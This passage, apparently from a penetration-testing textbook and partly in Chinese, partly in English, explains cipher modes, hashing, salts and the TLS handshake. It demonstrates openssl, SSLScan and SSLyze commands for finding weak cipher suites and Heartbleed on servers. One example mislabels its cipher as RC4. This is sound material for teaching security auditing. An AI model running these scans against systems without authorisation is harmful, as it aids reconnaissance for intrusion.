  \ (WEP)** 身份验证的 RC4 实现使用 24 位（3 字节）IV，这允许在短时间内重复密钥流。具有已知文本，例如 DHCP 请求，通过网络多次使用相同\
  \ IV 发送，允许攻击者恢复密钥流，并且多个密钥流/IV 对可用于恢复共享密钥。\n\n## 分组密码模式\n\n**工作模式** 是加密算法如何使用 IV\
  \ 以及如何实现对每个明文块的加密的方式。接下来，我们将讨论最常见的操作模式：\n\n- **电子密码本 (ECB)**：使用此操作模式，不使用 IV，每个块独立加密。因此，包含相同信息的块产生相同的密文，使分析和攻击更容易。\n\
  - **密码块链接 (CBC)**：在 CBC 模式下，块按顺序加密；IV 应用于第一个块，每个块的 resulting 密文用作加密下一个块的 IV。CBC\
  \ 模式密码可能容易受到填充 oracle 攻击，其中对最后一个块进行的填充可用于恢复密钥流，前提是攻击者可以恢复大量加密包，并且有一种方法可以知道包是否具有正确的填充（oracle）。\n\
  - **计数器 (CTR)**：如果实现正确，这可能是最方便和最安全的方法。块使用相同的 IV 加上每个块不同的计数器独立加密。这使得该模式能够并行处理消息的所有块，即使明文相同，每个块也具有不同的密文。\n\
  \n\n\n\n## Hashing functions\n\n**Hashing functions** are commonly used to ensure\
  \ the integrity of the message transmitted and as an identifier to determine quickly\
  \ if two pieces of information are the same. A hashing function generates a fixed-length\
  \ value (hash) that represents the actual data.\n\nHashing functions are suitable\
  \ to those tasks, because, by definition, no two different pieces of information\
  \ should have the same resulting hash (collision), and the original information\
  \ should not be recoverable from the hash alone (that is, hashing functions are\
  \ not reversible).\n\nSome of the most common hashing functions are as follows:\n\
  \n- MD5 (Message Digest 5)\n- SHA (Secure Hashing Algorithm) versions 1 and 2\n\
  - NT and NTLM, used by Microsoft Windows to store passwords, based on MD4\n\n##\
  \ Salt values\n\nWhen used to store secrets, such as passwords, hashes are vulnerable\
  \ to dictionary and brute-force attacks. An attacker that captures a set of password\
  \ hashes may try to use a dictionary of known common passwords, hash them, and compare\
  \ the results to the captured hashes, when looking for matches and discovering the\
  \ cleartext passwords when found. Once a hash-password pair is found, all other\
  \ users or accounts using the same password will also be discovered, as all hashes\
  \ would be the same.\n\n**Salt values** are used to make this task more difficult\
  \ by appending a random value to the information to be hashed and causing the hashing\
  \ of the same piece of data with different salts to result in different hashes.\
  \ In our previous hypothetical case, an attacker recovering the plaintext for one\
  \ hash would not have recovered all of the other instances of the same password\
  \ automatically.\n\nAs is the case with IVs, salts are stored and sent along with\
  \ the hashes.\n\n## Secure communication over SSL/TLS\n\n**Secure Sockets Layer\
  \ (SSL)** is an encryption protocol designed to secure communications over the network.\
  \ Netscape developed the SSL protocol in 1994. In 1999, the **Internet Engineering\
  \ Task Force (IETF)** released the **Transport Layer Security (TLS)** protocol,\
  \ superseding SSL protocol version 3. SSL is now considered insecure because of\
  \ multiple vulnerabilities identified over the years. The POODLE and BEAST vulnerabilities,\
  \ which we will discuss further in later sections, expose flaws in the SSL protocol\
  \ itself and hence cannot be fixed with a software patch. SSL was declared deprecated\
  \ by the IETF, and upgrading to TLS was suggested as the protocol to use for secure\
  \ communications. The most recent version of TLS is version 1.2. We always recommend\
  \ that you use the latest version of TLS and avoid allowing connections from clients\
  \ using older versions or the SSL protocol.\n\nMost websites have migrated to and\
  \ have started using the TLS protocol, but the encrypted communication is still\
  \ commonly referred to as an SSL connection. SSL/TLS not only provides confidentiality,\
  \ but it also helps to maintain the integrity of the data and to achieve nonrepudiation.\n\
  \nSecuring the communication between the client and the web application is the most\
  \ common use of TLS/SSL, and it is known as **HTTP over SSL** or **HTTPS**. TLS\
  \ is also used to secure the communication channel used by other protocols in the\
  \ following ways:\n\n- It is used by mail servers to encrypt emails between two\
  \ mail servers and also between the client and the mail server\n- TLS is used to\
  \ secure communication between database servers and LDAP authentication servers\n\
  - It is used to encrypt **Virtual Private Network (VPN)** connections known as **SSL\
  \ VPN**\n- Remote desktop services in the Windows operating system use TLS to encrypt\
  \ and authenticate the client connecting to the server\n\nThere are several other\
  \ applications and implementations where TLS is used to secure the communication\
  \ between two parties. In the following sections, we will refer to the protocol\
  \ used by HTTPS as TLS and we will specify when something only applies either to\
  \ SSL or TLS.\n\n## Secure communication in web applications\n\nTLS uses the public-private\
  \ key encryption mechanism to scramble data, which helps protect it from third parties\
  \ listening in on the communication. Sniffing the data over the network would only\
  \ reveal the encrypted information, which is of no use without access to the corresponding\
  \ key.\n\nThe TLS protocol is designed to protect the three facets of the CIA triad—confidentiality,\
  \ integrity, and availability:\n\n- **Confidentiality**: Maintaining the privacy\
  \ and secrecy of the data\n- **Integrity**: Maintaining the accuracy and consistency\
  \ of the data, and the assurance that it is not altered in transit\n- **Availability**:\
  \ Preventing data loss and maintaining access to data\n\nWeb server administrators\
  \ implement TLS to make sure that sensitive user information shared between the\
  \ web server and the client is secure. In addition to protecting the confidentiality\
  \ of the data, TLS also provides nonrepudiation using TLS certificates and digital\
  \ signatures. This provides the assurance that the message is indeed sent by the\
  \ party who is claiming to have sent it. This is similar to how a signature works\
  \ in our day-to-day life. These certificates are signed, verified, and issued by\
  \ an independent third-party known as Certificate Authority (CA). Some of the well-known\
  \ certificate authorities are listed here:\n\n- VeriSign\n- Thawte\n- Comodo\n-\
  \ DigiCert\n- Entrust\n- GlobalSign\n\nIf an attacker tries to fake the certificate,\
  \ the browser displays a warning message informing the user that an invalid certificate\
  \ is being used to encrypt the data.\n\nData integrity is achieved by calculating\
  \ a message digest using a hashing algorithm, which is attached to the message and\
  \ verified at the other end.\n\n## TLS encryption process\n\nEncryption is a multistep\
  \ process, but it is a seamless experience for end users. The entire process can\
  \ be broken down into two parts: the first part of encryption is done using the\
  \ asymmetric encryption technique, and the second part is done using the symmetric\
  \ encryption process. Here is a description of the major steps to encrypt and transmit\
  \ data using SSL:\n\n- 1. The handshake between the client and the server is the\
  \ initial step in which the client presents the SSL/TLS version number and the encryption\
  \ algorithms that it supports.\n- 2. The server responds by identifying the SSL\
  \ version and encryption algorithm that it supports, and both parties agree on the\
  \ highest mutual value. The server also responds with the SSL certificate. This\
  \ certificate contains the server's public key and general information about the\
  \ server.\n- 3. The client then authenticates the server by verifying the certificate\
  \ against the list of root certificates stored on the local computer. The client\
  \ checks with the certificate CA that the signed certificate issued to the website\
  \ is stored in the list of trusted CAs. In Internet Explorer, the list of trusted\
  \ CAs can be viewed by navigating to Tools | Internet options | Content | Certificates\
  \ | Trusted Root Certification Authorities, as seen in the following screenshot:\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_302_0.png)\n\n- 4. Using the information\
  \ shared during the handshake, the client can generate a pre-master secret for the\
  \ session. It then encrypts the secret with the server's public key and sends the\
  \ encrypted pre-master key back to the server.\n- 5. The server decrypts the pre-master\
  \ key using the private key (since it was encrypted with the public key). The server\
  \ and the client then both generate a session key from the pre-master key using\
  \ a series of steps. This session key encrypts the data throughout the entire session,\
  \ which is called the symmetric encryption. A hash is also calculated and appended\
  \ to the message, which helps test the integrity of the message.\n\n## Identifying\
  \ weak implementations of SSL/TLS\n\nAs you learned in the previous section, TLS\
  \ is a combination of various encryption algorithms packaged into one in order to\
  \ provide confidentiality, integrity, and authentication. In the first step, when\
  \ two endpoints negotiate for an SSL connection, they identify the common cipher\
  \ suites supported by them. This allows SSL to support a wide variety of devices,\
  \ which may not have the hardware and software to support the newer ciphers. Supporting\
  \ older encryption algorithms has a major drawback. Most older cipher suites are\
  \ easily breakable in a reasonable amount of time by cryptanalysts using the computing\
  \ power available today.\n\n## The OpenSSL command-line tool\n\nIn order to identify\
  \ the cipher suites negotiated by the remote web server, you can use the OpenSSL\
  \ command-line tool that comes preinstalled on all major Linux distributions, and\
  \ it is also included in Kali Linux. The tool can be used to test the various functions\
  \ of the OpenSSL library directly from the bash shell without writing any code.\
  \ It is also used as a troubleshooting tool.\n\nOpenSSL is a well-known library\
  \ used in Linux to implement the SSL protocol, and Secure channel (Schannel) is\
  \ a provider of the SSL functionality in Windows.\n\n\n\n\n\n以下示例使用 s_client 命令行选项，该选项使用\
  \ SSL/TLS 建立与远程服务器的连接。对新手来说，该命令的输出难以解读，但它对于识别服务器与客户端之间协商的 TLS/SSL 版本和密码套件很有用：\n\n\
  ![](img/6b6e557533100c0e47951d0e5e14c4ee_304_0.png)\n\nOpenSSL 实用程序包含各种命令行选项，可用于使用特定的\
  \ SSL 版本和密码套件测试服务器。在以下示例中，我们尝试使用 TLS 版本 1.2 和一种弱算法 RC4 进行连接：\n\n```\nopenssl s_client\
  \ -tls1_2 -cipher 'ECDHE-RSA-AES256-SHA' -connect <target>:<port>\n```\n\n以下屏幕截图显示了命令的输出。由于客户端无法与\
  \ ECDHE-RSA-AES256-SHA 密码套件协商，因此握手失败，未选择任何密码：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_305_0.png)\n\
  \n在以下屏幕截图中，我们尝试与服务器协商一种弱加密算法。它失败了，因为 Google 已正确在服务器上禁用了弱密码套件：\n\n```\nroot@kali:~#\
  \ openssl s_client -tls1_2 -cipher \"NULL,EXPORT,LOW,DES\" -connect www.google.com:443\n\
  CONNECTED(00000003)\n139783222056192:error:141640B5:SSL routines:tls_construct_client_hello:no\
  \ ciphers available:../ssl/m/state_m_clnt.c:800:\n---\nno peer certificate available\n\
  ---\nNo client certificate CA names sent\n---\nSSL handshake has read 0 bytes and\
  \ written 0 bytes\nVerification: OK\n---\nNew, (NONE), Cipher is (NONE)\nSecure\
  \ Renegotiation IS NOT supported\nCompression: NONE\nExpansion: NONE\nNo ALPN negotiated\n\
  SSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : 0000\n    Session-ID:\n \
  \   Session-ID-ctx:\n    Master-Key:\n    PSK identity: None\n    PSK identity hint:\
  \ None\n    SRP username: None\n    Start Time: 1517833355\n    Timeout   : 7200\
  \ (sec)\n    Verify return code: 0 (ok)\n    Extended master secret: no\n---\n```\n\
  \n要查找出使用当前可用计算能力即可轻易破解的密码套件，请输入以下屏幕截图中所示的命令：\n\n```\nroot@kali:~# openssl ciphers\
  \ -v \"NULL,EXPORT,LOW,DES\"\nECDHE-ECDSA-NULL-SHA    TLSv1 Kx=ECDH   Au=ECDSA Enc=None\
  \  Mac=SHA1\nECDHE-RSA-NULL-SHA      TLSv1 Kx=ECDH   Au=RSA   Enc=None  Mac=SHA1\n\
  AECDH-NULL-SHA          TLSv1 Kx=ECDH   Au=None  Enc=None  Mac=SHA1\nNULL-SHA256\
  \             TLSv1.2 Kx=RSA  Au=RSA   Enc=None  Mac=SHA256\nECDHE-PSK-NULL-SHA384\
  \   TLSv1 Kx=ECDHEPSK Au=PSK   Enc=None  Mac=SHA384\nECDHE-PSK-NULL-SHA256   TLSv1\
  \ Kx=ECDHEPSK Au=PSK   Enc=None  Mac=SHA256\nECDHE-PSK-NULL-SHA      TLSv1 Kx=ECDHEPSK\
  \ Au=PSK   Enc=None  Mac=SHA1\nRSA-PSK-NULL-SHA384     TLSv1 Kx=RSAPSK Au=RSA  \
  \ Enc=None  Mac=SHA384\nRSA-PSK-NULL-SHA256     TLSv1 Kx=RSAPSK Au=RSA   Enc=None\
  \  Mac=SHA256\nDHE-PSK-NULL-SHA384     TLSv1 Kx=DHEPSK Au=PSK   Enc=None  Mac=SHA384\n\
  DHE-PSK-NULL-SHA256     TLSv1 Kx=DHEPSK Au=PSK   Enc=None  Mac=SHA256\nRSA-PSK-NULL-SHA\
  \        SSLv3 Kx=RSAPSK Au=RSA   Enc=None  Mac=SHA1\nDHE-PSK-NULL-SHA        SSLv3\
  \ Kx=DHEPSK Au=PSK   Enc=None  Mac=SHA1\nNULL-SHA                SSLv3 Kx=RSA  \
  \  Au=RSA   Enc=None  Mac=SHA1\nNULL-MD5                SSLv3 Kx=RSA    Au=RSA \
  \  Enc=None  Mac=MD5\nPSK-NULL-SHA384         TLSv1 Kx=PSK    Au=PSK   Enc=None\
  \  Mac=SHA384\nPSK-NULL-SHA256         TLSv1 Kx=PSK    Au=PSK   Enc=None  Mac=SHA256\n\
  PSK-NULL-SHA            SSLv3 Kx=PSK    Au=PSK   Enc=None  Mac=SHA1\n```\n\n你经常会看到密码套件写成\
  \ **ECDHE-RSA-RC4-MD5**。其格式可分解为以下几部分：\n\n- **ECDHE**：这是一种密钥交换算法\n- **RSA**：这是一种身份验证算法\n\
  - **RC4**：这是一种加密算法\n- **MD5**：这是一种哈希算法\n\nSSL 和 TLS 密码套件的完整列表可在 https://www.openssl.org/docs/apps/ciphers.html\
  \ 找到。\n\n## SSLScan\n\n尽管 OpenSSL 命令行工具提供了许多用于测试 SSL 配置的选项，但该工具的输出并不友好。该工具还要求对要测试的密码套件有相当多的了解。\n\
  \nKali Linux 附带了许多工具，可自动执行识别 SSL 配置错误、过时协议版本以及弱密码套件和哈希算法的任务。其中一个工具是 **SSLScan**，可通过\
  \ **应用程序 | 信息收集 | SSL 分析** 访问。\n\n默认情况下，SSLScan 会检查服务器是否易受 CRIME 和 Heartbleed 漏洞的影响。`-tls`\
  \ 选项将强制 SSLScan 仅使用 TLS 协议测试密码套件。\n\n输出以各种颜色分布，其中绿色表示密码套件安全，而红色和黄色部分则试图引起你的注意：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_308_0.png)\n\n客户端支持的密码套件可通过运行以下命令来识别。它将显示客户端支持的长密码列表：\n\
  \n```\nsslscan -show-ciphers www.example.com:443\n```\n\n如果要分析证书相关数据，请使用以下命令，它将显示证书的详细信息：\n\
  \n```\nsslscan --show-certificate --no-ciphersuites www.amazon.com:443\n```\n\n\
  命令的输出可使用 -xml=<filename> 选项导出为 XML 文档。\n\n请注意支持的密码名称中出现的 NULL。如果选择了 NULL 密码，SSL/TLS\
  \ 握手将完成，浏览器将显示安全挂锁，但 HTTP 数据将以明文传输。\n\n## SSLyze\n\n另一个随 Kali Linux 提供的、有助于分析 SSL\
  \ 配置的有趣工具是 iSEC Partners 发布 的 SSLyze 工具。该工具托管在 GitHub 上的 https://github.com/iSECPartners/sslyze\
  \ ，可在 Kali Linux 中在 应用程序 | 信息收集 | SSL 分析 中找到。SSLyze 用 Python 编写。\n\n该工具附带了各种插件，可帮助测试以下内容：\n\
  \n- 检查旧版本的 SSL\n- 分析密码套件并识别弱密码\n- 使用输入文件扫描多个服务器\n- 检查会话恢复支持\n\n使用 -regular 选项可包含你可能感兴趣的所有常见选项，例如测试所有可用协议（SSL\
  \ 版本 2 和 3 以及 TLS 1.0、1.1 和 1.2）、测试不安全的密码套件以及识别是否启用了压缩。\n\n在以下示例中，服务器不支持压缩，并且易受\
  \ Heartbleed 攻击。输出还列出了接受的密码套件：\n\n```\nSCAN RESULTS FOR 10.7.7.8:8443 - 10.7.7.8:8443\n\
  ------------------------------------------------\n* Session Renegotiation:\n   \
  \ Client-initiated Renegotiations:  OK - Rejected\n    Secure Renegotiation:   \
  \         OK - Supported\n* Deflate Compression:\n    OK - Compression disabled\n\
  * Session Resumption:\n    With Session IDs:                NOT SUPPORTED (0 successful,\
  \ 5 failed, 0 errors\n    With TLS Session Tickets:        OK - Supported\n* OpenSSL\
  \ Heartbleed:\n    VULNERABLE - Server is vulnerable to Heartbleed\n* TLSV1_2 Cipher\
  \ Suites:\n    Preferred:\n        ECDHE-RSA-AES256-GCM-SHA384    ECDH-256 bits\
  \  256 bits    HTTP 200 OK\n    Accepted:\n        ECDHE-RSA-AES256-SHA384     \
